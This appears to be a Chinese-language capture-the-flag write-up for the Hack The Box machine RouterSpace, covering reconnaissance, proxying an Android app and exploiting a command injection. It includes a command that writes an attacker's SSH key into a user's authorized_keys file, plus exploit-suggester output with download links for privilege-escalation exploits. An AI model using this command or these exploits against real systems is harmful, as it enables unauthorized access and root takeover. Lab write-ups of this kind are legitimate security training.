[https://app.hackthebox.com/machines/444](https://app.hackthebox.com/machines/444)

nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271333286.png)

---

可以下载一个`RouterSpace.apk`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271338863.png)

>配置anbox代理

1. burpsuite的监听设置为监听全部端口

2. `adb shell settings put global http_proxy 192.168.250.1:8080`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271341316.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271342993.png)

---

将`10.10.11.148    routerspace.htb`添加到`/etc/hosts`中

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271345185.png)

存在命令注入

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271350787.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271350885.png)

`echo 'ssh-rsa AAAxxxWpa2NE297s= kali@kali' > /home/paul/.ssh/authorized_keys`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271401468.png)

---

```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
```

`CVE-2021-4034`不行,`CVE-2021-3156`可以

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271415875.png)